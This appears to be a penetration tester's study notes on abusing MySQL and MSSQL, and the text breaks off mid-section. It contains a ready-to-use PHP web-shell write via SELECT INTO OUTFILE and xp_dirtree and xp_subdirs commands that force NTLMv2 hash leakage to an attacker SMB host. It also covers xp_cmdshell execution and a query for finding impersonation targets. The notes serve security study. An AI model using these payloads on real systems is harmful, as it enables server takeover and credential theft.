** Execute Commands
*** MSSQL
- extended stored procedure -> =xp_cmdshell=
**** XP_CMDSHELL
- disabled by default
- toggled using =Policy-Based Management= or executing =sp_configure=
- windows process spawned by xp_cmdshell has same security rights as SQL server service account
- operates synchronously. control not returned to caller until cmd-shell cmd completed.

** Write Local Files
 - can achieve cmd execution on =mysql= if we write to location in file system that can exec cmds
 - =MySQL= operates on php based web server or =ASP.NET=.
 - if appropriate priv, can attempt to write file using ~SELECT INTO OUTFILE~

*** MySQL - Write Local File
- ~SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';~
- =secure_file_priv= limits effect of data import & export operations (~LOAD DATA~ & ~SELECT ... INTO OUTFILE~) & =LOAD_FILE()= fn()
- operations permitted only to users w =FILE= priv

**** Secure File Priv
- may be set as:
  - *empty*: var has no effect (not secure), can read or write data using mysql
  - *directory name*: server limits import & export ops to work only w/in that dir. dir must exist beforehand
  - *NULL*: disables all import/export
- ~show variables like "secure_file_priv"~

** MSSQL Specifics
*** Capture MSSQL Service Hash
- using =xp_subdirs= or =xp_dirtree= (undocuments stored procedures)
  - use SMB to retrieve list of child directories undner specified parent directory from FS.
  - when used and pointed to SMB server, directory listening
    functionality forces server to authenticate & send NTLMv2 hash of
    service account running SQL server
  - need to start =responder= or =impacket-smbserver=
    
**** XP_DIRTREE Hash Stealing
~EXEC master..xp_dirtree '\\10.10.110.17\share\'~
~GO~

**** XP_SUBDIRS Hash Stealing
~EXEC master..xp_subdirs '\\10.10.110.17\share\'~

*** Impersonate existing users with MSSQL
- SQL server has permission =IMPERSONATE= to allow executing user to take on permissions of another user or login until context is reset

**** Find User to Impersonate
#+begin_src MSSQL
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
